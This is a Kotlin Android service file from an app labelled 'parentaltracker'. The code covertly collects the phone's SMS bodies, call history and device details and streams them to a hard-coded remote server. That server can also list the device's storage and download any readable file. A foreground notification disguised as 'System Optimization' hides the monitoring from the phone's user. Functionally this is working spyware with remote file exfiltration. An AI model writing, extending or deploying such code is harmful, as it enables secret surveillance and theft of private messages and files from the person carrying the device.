package com.parentaltracker

import android.app.*
import android.content.*
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.File
import java.net.URISyntaxException
import android.os.BatteryManager
import android.os.Environment
import kotlinx.coroutines.*
import org.json.JSONArray

class MonitoringService : Service() {

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""
    private var deviceModel: String = ""
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatJob: Job? = null

    // Server URL - Change this to your server URL
    private val SERVER_URL = "http://192.168.31.53:3000"

    private lateinit var smsObserver: ContentObserver
    private lateinit var callObserver: ContentObserver
    private lateinit var contentResolver: ContentResolver

    private var lastSmsId: Long = 0
    private var lastCallId: Long = 0
    private var batteryLevel: Int = 0
    private var isCharging: Boolean = false

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1

            batteryLevel = if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else 0
            isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
        }
    }

    override fun onCreate() {
        super.onCreate()

        serviceScope.launch {
            try {
                withContext(Dispatchers.Main) {
                    createNotificationChannel()
                    startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                }

                contentResolver = applicationContext.contentResolver

                // Initialize device info
                deviceId = android.provider.Settings.Secure.getString(
                    contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                ) ?: "unknown"
                deviceName = Build.MANUFACTURER
                deviceModel = Build.MODEL

                // Register battery receiver
                val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                registerReceiver(batteryReceiver, filter)

                // Setup observers
                setupDataObservers()

                // Connect to server
                initializeSocket()

                // Start heartbeat
                runHeartbeat()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Core Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Internal system optimization"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            Notification.Builder(this)
        }

        return builder
            .setContentTitle("System Optimization")
            .setContentText("Optimizing battery usage...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    private fun setupDataObservers() {
        // SMS Observer
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                serviceScope.launch { processIncomingData(true) }
            }
        }
        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)

        // Call Log Observer
        callObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                serviceScope.launch { processIncomingData(false) }
            }
        }
        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callObserver)
    }

    private fun initializeSocket() {
        try {
            val opts = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = Integer.MAX_VALUE
                reconnectionDelay = 3000
                timeout = 15000
            }

            socket = IO.socket(SERVER_URL, opts)

            socket?.on(Socket.EVENT_CONNECT) {
                serviceScope.launch {
                    syncDeviceInfo()
                    syncInternalHistory()
                }
            }

            socket?.on("requestFiles") { args ->
                val path = args[0] as? String ?: "/"
                serviceScope.launch { processFileRequest(path) }
            }

            socket?.on("requestFileDownload") { args ->
                val filePath = args[0] as? String ?: ""
                serviceScope.launch { streamFileContent(filePath, 0) }
            }

            socket?.on("requestFileChunk") { args ->
                val filePath = args[0] as? String ?: ""
                val offset = (args[1] as? Number)?.toLong() ?: 0L
                serviceScope.launch { streamFileContent(filePath, offset) }
            }

            socket?.connect()
        } catch (e: Exception) {
            serviceScope.launch {
                delay(5000)
                initializeSocket()
            }
        }
    }

    private suspend fun syncDeviceInfo() {
        val info = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("deviceModel", deviceModel)
            put("battery", batteryLevel)
            put("charging", isCharging)
            put("version", Build.VERSION.RELEASE)
        }
        socket?.emit("deviceInfo", info)
    }

    private fun runHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                syncDeviceInfo()
                delay(10000) // 10 seconds
            }
        }
    }

    private suspend fun processIncomingData(isSms: Boolean) {
        if (isSms) {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return

            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
                "${Telephony.Sms._ID} > ?",
                arrayOf(lastSmsId.toString()),
                "${Telephony.Sms._ID} DESC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val smsData = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("body", body)
                        put("type", if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "incoming" else "outgoing")
                        put("date", date)
                    }
                    socket?.emit("newSMS", smsData)
                    if (id > lastSmsId) lastSmsId = id
                }
            }
        } else {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return

            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
                "${CallLog.Calls._ID} > ?",
                arrayOf(lastCallId.toString()),
                "${CallLog.Calls._ID} DESC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))

                    val callData = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("type", when(type) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            else -> "missed"
                        })
                        put("duration", duration)
                        put("date", date)
                    }
                    socket?.emit("newCall", callData)
                    if (id > lastCallId) lastCallId = id
                }
            }
        }
    }

    private suspend fun syncInternalHistory() {
        // SMS History
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
                null, null, "${Telephony.Sms._ID} DESC LIMIT 500"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val data = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("body", body)
                        put("type", if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "incoming" else "outgoing")
                        put("date", date)
                    }
                    socket?.emit("newSMS", data)
                    if (id > lastSmsId) lastSmsId = id
                    count++
                    if (count % 20 == 0) delay(50)
                }
            }
        }

        // Call History
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls._ID} DESC LIMIT 300"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))

                    val data = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("type", if (type == CallLog.Calls.INCOMING_TYPE) "incoming" else "outgoing")
                        put("date", date)
                    }
                    socket?.emit("newCall", data)
                    if (id > lastCallId) lastCallId = id
                    count++
                    if (count % 20 == 0) delay(50)
                }
            }
        }
    }

    private suspend fun processFileRequest(path: String) {
        try {
            val root = Environment.getExternalStorageDirectory()
            val currentPath = if (path == "/") root else File(root, path)

            if (!currentPath.exists() || !currentPath.canRead()) {
                socket?.emit("fileList", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("path", path)
                    put("error", "Access denied")
                    put("files", JSONArray())
                })
                return
            }

            val fileList = mutableListOf<Map<String, Any>>()
            if (currentPath.isDirectory) {
                currentPath.listFiles()?.sortedBy { !it.isDirectory }?.forEach { file ->
                    fileList.add(mapOf(
                        "name" to file.name,
                        "path" to file.absolutePath.replace(root.absolutePath, ""),
                        "isDirectory" to file.isDirectory,
                        "size" to file.length()
                    ))
                }
            }

            socket?.emit("fileList", JSONObject().apply {
                put("deviceId", deviceId)
                put("path", path)
                put("files", JSONArray(fileList))
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun streamFileContent(filePath: String, offset: Long) {
        try {
            val root = Environment.getExternalStorageDirectory()
            val file = File(root, filePath)

            if (!file.exists() || !file.isFile || !file.canRead()) {
                socket?.emit("fileChunk", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("filePath", filePath)
                    put("error", "Read error")
                })
                return
            }

            val fileSize = file.length()
            val chunkSize = 64 * 1024 // 64KB for better stability
            val remaining = fileSize - offset

            if (remaining <= 0) {
                socket?.emit("fileChunk", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("filePath", filePath)
                    put("complete", true)
                })
                return
            }

            val bytesToRead = if (remaining > chunkSize) chunkSize else remaining.toInt()
            file.inputStream().use { input ->
                input.skip(offset)
                val buffer = ByteArray(bytesToRead)
                val read = input.read(buffer)
                if (read > 0) {
                    val base64 = android.util.Base64.encodeToString(buffer, 0, read, android.util.Base64.NO_WRAP)
                    socket?.emit("fileChunk", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("filePath", filePath)
                        put("offset", offset)
                        put("totalSize", fileSize)
                        put("data", base64)
                        put("complete", offset + read >= fileSize)
                    })
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        try {
            contentResolver.unregisterContentObserver(smsObserver)
            contentResolver.unregisterContentObserver(callObserver)
            unregisterReceiver(batteryReceiver)
            socket?.disconnect()
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    companion object {
        private const val CHANNEL_ID = "SystemCoreOptimization"
        private const val NOTIFICATION_ID = 101
    }
}
